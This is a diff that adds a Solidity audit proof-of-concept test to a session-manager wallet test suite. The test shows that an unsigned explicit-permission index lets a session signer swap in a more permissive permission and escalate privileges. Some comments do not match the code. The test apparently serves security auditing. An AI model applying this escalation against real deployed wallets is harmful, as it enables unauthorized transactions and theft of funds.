@@ -867,4 +867,84 @@ contract SessionManagerTest is SessionTestBase {
     return (imageHash, encodedSig);
   }
 
+  //@audit-poc
+  function test_FlagByteSwap_ExplicitPermissionIndexNotSigned_AllowsEscalation() external {
+    Payload.Decoded memory payload = _buildPayload(1);
+
+    // First call with BEHAVIOR_ABORT_ON_ERROR (should revert)
+    payload.calls[0] = Payload.Call({
+      to: address(emitter),
+      value: 0,
+      data: abi.encodeWithSelector(emitter.explicitEmit.selector),
+      gasLimit: 0,
+      delegateCall: false,
+      onlyFallback: false,
+      behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR // This should revert
+     });
+
+    // Session permissions
+    SessionPermissions memory sessionPerms = SessionPermissions({
+      signer: sessionWallet.addr,
+      chainId: block.chainid,
+      valueLimit: 0,
+      deadline: uint64(block.timestamp + 1 days),
+      permissions: new Permission[](2)
+    });
+
+    ParameterRule[] memory rule0 = new ParameterRule[](1);
+    // Rules for explicitTarget in call 0.
+    rule0[0] = ParameterRule({
+      cumulative: false,
+      operation: ParameterOperation.EQUAL,
+      value: bytes32(uint256(uint32(~emitter.explicitEmit.selector)) << 224),
+      offset: 0,
+      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
+    });
+
+    ParameterRule[] memory rule1 = new ParameterRule[](1);
+    rule1[0] = ParameterRule({
+      cumulative: false,
+      operation: ParameterOperation.EQUAL,
+      value: bytes32(uint256(uint32(emitter.explicitEmit.selector)) << 224),
+      offset: 0, // offset the param (selector is 4 bytes)
+      mask: bytes32(uint256(uint32(0xffffffff)) << 224)
+    });
+
+    sessionPerms.permissions[0] = Permission({ target: address(emitter), rules: rule0 });
+    sessionPerms.permissions[1] = Permission({ target: address(emitter), rules: rule1 }); // Unlimited access
+
+    string memory topology = PrimitivesRPC.sessionEmpty(vm, identityWallet.addr);
+    string memory sessionPermsJson = _sessionPermissionsToJSON(sessionPerms);
+    topology = PrimitivesRPC.sessionExplicitAdd(vm, sessionPermsJson, topology);
+    string memory sessionSignature =
+      _signAndEncodeRSV(SessionSig.hashCallWithReplayProtection(payload, 0), sessionWallet);
+
+    {
+      uint256 callCount = payload.calls.length;
+      string[] memory callSignatures = new string[](callCount);
+      callSignatures[0] = _explicitCallSignatureToJSON(0, sessionSignature);
+      address[] memory explicitSigners = new address[](1);
+      explicitSigners[0] = sessionWallet.addr;
+      address[] memory implicitSigners = new address[](0);
+
+      bytes memory encodedSigIdx0 =
+        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
+      vm.expectRevert();
+      sessionManager.recoverSapientSignature(payload, encodedSigIdx0);
+    }
+
+    {
+      uint256 callCount = payload.calls.length;
+      string[] memory callSignatures = new string[](callCount);
+      callSignatures[0] = _explicitCallSignatureToJSON(1, sessionSignature);
+      address[] memory explicitSigners = new address[](1);
+      explicitSigners[0] = sessionWallet.addr;
+      address[] memory implicitSigners = new address[](0);
+
+      bytes memory encodedSigIdx1 =
+        PrimitivesRPC.sessionEncodeCallSignatures(vm, topology, callSignatures, explicitSigners, implicitSigners);
+
+      sessionManager.recoverSapientSignature(payload, encodedSigIdx1);
+    }
+  }
 }
